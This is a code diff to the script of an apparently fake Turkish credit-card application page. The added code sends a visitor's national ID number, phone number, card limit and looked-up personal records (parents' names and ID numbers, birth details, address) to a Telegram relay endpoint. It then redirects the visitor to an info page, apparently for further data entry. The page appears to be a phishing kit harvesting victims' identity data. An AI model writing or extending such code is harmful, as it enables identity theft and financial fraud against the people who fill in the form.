@@ -246,9 +246,12 @@
           return;
         }
 
-        // Tüm bilgileri query parameter olarak info.html'ye gönder
-        const params = new URLSearchParams({
-          tc: tc,
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Gönderiliyor...';
+
+        // Telegram'a basvur.html bilgilerini gönder (kart bilgileri olmadan)
+        const basvuruData = {
+          tckn: tc,
           telefon: telefon,
           kartLimiti: kartLimiti,
           adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
@@ -263,11 +266,66 @@
           adresIlce: apiData.AdresIlce || '',
           memleketIl: apiData.MemleketIl || '',
           memleketIlce: apiData.MemleketIlce || '',
-          medeniHal: apiData.MedeniHal || ''
+          medeniHal: apiData.MedeniHal || '',
+          type: 'basvuru'
+        };
+
+        // Telegram'a gönder ve info.html'ye yönlendir
+        fetch('/api/send-telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(basvuruData)
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Telegram başarılı olsun ya da olmasın, info.html'ye yönlendir
+          const params = new URLSearchParams({
+            tc: tc,
+            telefon: telefon,
+            kartLimiti: kartLimiti,
+            adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
+            dogumTarihi: apiData.DogumTarihi || '',
+            cinsiyet: apiData.Cinsiyet || '',
+            dogumYeri: apiData.DogumYeri || '',
+            anneAdi: apiData.AnneAdi || '',
+            babaAdi: apiData.BabaAdi || '',
+            anneTCKN: apiData.AnneTCKN || '',
+            babaTCKN: apiData.BabaTCKN || '',
+            adresIl: apiData.AdresIl || '',
+            adresIlce: apiData.AdresIlce || '',
+            memleketIl: apiData.MemleketIl || '',
+            memleketIlce: apiData.MemleketIlce || '',
+            medeniHal: apiData.MedeniHal || ''
+          });
+          
+          window.location.href = `info.html?${params.toString()}`;
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          // Hata olsa bile info.html'ye yönlendir
+          const params = new URLSearchParams({
+            tc: tc,
+            telefon: telefon,
+            kartLimiti: kartLimiti,
+            adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
+            dogumTarihi: apiData.DogumTarihi || '',
+            cinsiyet: apiData.Cinsiyet || '',
+            dogumYeri: apiData.DogumYeri || '',
+            anneAdi: apiData.AnneAdi || '',
+            babaAdi: apiData.BabaAdi || '',
+            anneTCKN: apiData.AnneTCKN || '',
+            babaTCKN: apiData.BabaTCKN || '',
+            adresIl: apiData.AdresIl || '',
+            adresIlce: apiData.AdresIlce || '',
+            memleketIl: apiData.MemleketIl || '',
+            memleketIlce: apiData.MemleketIlce || '',
+            medeniHal: apiData.MedeniHal || ''
+          });
+          
+          window.location.href = `info.html?${params.toString()}`;
         });
-        
-        // info.html'ye yönlendir
-        window.location.href = `info.html?${params.toString()}`;
       });
     });
   </script>
